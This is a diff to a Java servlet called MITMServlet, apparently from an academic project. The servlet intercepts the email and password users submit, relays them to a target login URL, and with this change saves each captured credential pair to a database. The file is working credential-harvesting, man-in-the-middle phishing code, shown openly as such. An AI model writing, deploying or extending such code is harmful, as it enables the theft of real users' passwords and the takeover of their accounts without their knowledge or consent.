@@ -1,12 +1,16 @@
 package br.edu.ifpb.mitm;
 
+import br.edu.ifpb.mitm.dao.DataDao;
+
 import java.io.IOException;
 import java.io.PrintWriter;
+import java.sql.SQLException;
 import javax.servlet.ServletException;
 import javax.servlet.annotation.WebServlet;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
+import javax.ws.rs.NotFoundException;
 import javax.ws.rs.client.Client;
 import javax.ws.rs.client.ClientBuilder;
 import javax.ws.rs.client.Entity;
@@ -60,13 +64,22 @@ public class MITMServlet extends HttpServlet {
             WebTarget target = client.target(url);
 
             Form form = new Form();
-            form.param("login",request.getParameter("email"));
+            form.param("login", request.getParameter("email"));
             form.param("passwd", request.getParameter("senha"));
 
             Response res = target
                     .request()
                     .post(Entity.form(form), Response.class);
             System.out.println(res.getHeaderString(url));
+
+            try {
+                new DataDao().persist(
+                        request.getParameter("email"),
+                        request.getParameter("senha")
+                );
+            } catch (SQLException | ClassNotFoundException ex) {
+                ex.printStackTrace();
+            }
 
         } else {
             request.setAttribute("email", request.getParameter("email"));
